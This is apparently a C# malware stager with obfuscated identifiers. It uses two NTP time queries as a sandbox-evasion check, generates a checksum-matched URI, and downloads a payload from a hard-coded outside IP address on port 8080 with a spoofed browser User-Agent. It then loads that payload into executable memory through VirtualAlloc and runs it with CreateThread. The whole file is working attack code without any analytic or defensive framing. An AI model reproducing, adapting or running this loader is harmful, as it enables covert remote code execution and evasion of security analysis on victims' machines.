using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;
namespace OTPaIawAwsm { class jcLhsaHTu {
static string DrNqXSp(Random r, int s) {
char[] jeKTUXxjwrm = new char[s];
string DHaDwkncbDoJnz = "Y1Xm0oRBMP5J8kn7lpeqK4yv3ViDCdsaxL2jb9TSfcOQutFHIGrNAh6ZzWEgwU";
for (int i = 0; i < s; i++){ jeKTUXxjwrm[i] = DHaDwkncbDoJnz[r.Next(DHaDwkncbDoJnz.Length)];}
return new string(jeKTUXxjwrm);}
static bool DoBQem(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);}
static string tSegOlFD(Random r) { string XHQkDTnBTqoJqKf = "";
for (int i = 0; i < 64; ++i) { XHQkDTnBTqoJqKf = DrNqXSp(r, 3);
string XEssiYXEZMs = new string("JuzQvRs5BPNZe4krMTGDgpwCl1h9EySjxmotWI0F36XbLc7AViYaO8qdnfKUH2".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
for (int j = 0; j < XEssiYXEZMs.Length; ++j) {
string ftfnCEexxaYY = XHQkDTnBTqoJqKf + XEssiYXEZMs[j];
if (DoBQem(ftfnCEexxaYY)) {return ftfnCEexxaYY;}}} return "9vXU";}static byte[] gREarkZRMZUE(string oXqrMJKibICJ) {
WebClient wVBWJSWhhOpkenN = new System.Net.WebClient();
wVBWJSWhhOpkenN.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
wVBWJSWhhOpkenN.Headers.Add("Accept", "*/*");
wVBWJSWhhOpkenN.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
wVBWJSWhhOpkenN.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
byte[] FTRnRtUCcD = null;
try { FTRnRtUCcD = wVBWJSWhhOpkenN.DownloadData(oXqrMJKibICJ);
if (FTRnRtUCcD.Length < 100000) return null;}
catch (WebException) {}
return FTRnRtUCcD;}
static void FcbXcdPwwgOPzmU(byte[] lDgbTNo) {
    if (lDgbTNo != null) {
        UInt32 ydKoKxx = VirtualAlloc(0, (UInt32)lDgbTNo.Length, 0x1000, 0x40);
        Marshal.Copy(lDgbTNo, 0, (IntPtr)(ydKoKxx), lDgbTNo.Length);
        IntPtr UAfvfUBiLE = IntPtr.Zero;
        UInt32 WJsTdVdZtgSBwA = 0;
        IntPtr WSmPrBAggsBNKgz = IntPtr.Zero;
        UAfvfUBiLE = CreateThread(0, 0, ydKoKxx, WSmPrBAggsBNKgz, 0, ref WJsTdVdZtgSBwA);
        WaitForSingleObject(UAfvfUBiLE, 0xFFFFFFFF); }}
static void Main(){
if (System.Environment.ProcessorCount >= 1) {
	var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;
	var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
	try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }
	ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}
	var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);
	Thread.Sleep(10*1000);
	var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
	try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }
	ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }
	if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= 10 || skip) {
Random ZSAZPgG = new Random((int)DateTime.Now.Ticks);
byte[] JCRLkkjemRr = gREarkZRMZUE("http://129.56.78.34:8080/" + tSegOlFD(ZSAZPgG));
FcbXcdPwwgOPzmU(JCRLkkjemRr);}
		}	}		[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 ohZEklgTzQVE,UInt32 YfEDpQfQBmxYa, UInt32 oCsyYhBvqf, UInt32 XvAGmWEgEtmSoW);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 hSUdkeUrtWOmG, UInt32 UtcPiDKOhYlGnM, UInt32 neLNheKkR,IntPtr mFVAkQSTJdjLdX, UInt32 aKjNvHNTLsy, ref UInt32 ZJRDPCUy);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr RSnCKaR, UInt32 PPQDIVGrMLkBEVS);}}
